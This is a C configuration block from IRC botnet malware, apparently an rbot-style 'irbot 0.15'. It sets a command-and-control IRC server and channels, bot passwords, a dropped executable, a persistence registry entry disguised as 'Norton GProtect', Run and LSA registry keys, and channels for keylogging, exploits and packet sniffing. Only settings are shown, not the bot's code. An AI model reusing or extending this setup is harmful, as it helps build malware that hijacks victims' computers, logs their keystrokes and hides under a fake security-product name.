

int port = 6667;
int port2 = 6667;
int tftpport = 690;
int httpport = 800;
int maxrand = 7;
int nicktype = CONSTNICK;

BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;
BOOL nickprefix = FALSE;




#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif
#ifndef NO_CRYPT
#else

char lsaip[] = "";                   // don't change this line
char lsaport[] = "2009";
char lsuser[] = "irb";
char lspass[] = "bri";
char prefix = '.';
char botid[] = "fuckyou";
char version[] = "irbot 0.15";
char password[] = "penis";
char server[] = "irc.got.pwnt.edu";
char serverpass[] = "";
char channel[] = "#fuckyou";
char chanpass[] = "keyzzz";
char server2[] = "irc.got.pwnt.edu";
char channel2[] = "#fuckyou";
char chanpass2[] = "keyzzz";
char filename[] = "ngrfn.exe";
char keylogfile[] = "boob.txt";
char valuename[] = "Norton GProtect";
char nickconst[] = "oWnT-";
char szLocalPayloadFile[]="ngrfn.exe";
char modeonconn[] = "+xi";
char exploitchan[] = "#fuckyou-ec";
char keylogchan[] = "#fuckyou-kl";
char psniffchan[] = "#fuckyou-ps";

char *authost[] = {
	"*@*1.2.3.4"
};

	char *versionlist[] = {
		"eggdrop v1.6.17",
		"eggdrop v1.6.16",
		"eggdrop v1.6.15",
		"eggdrop v1.6.14",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
	char key[16] = "ghhgnrb4nfmdn3hdnd1";
#endif
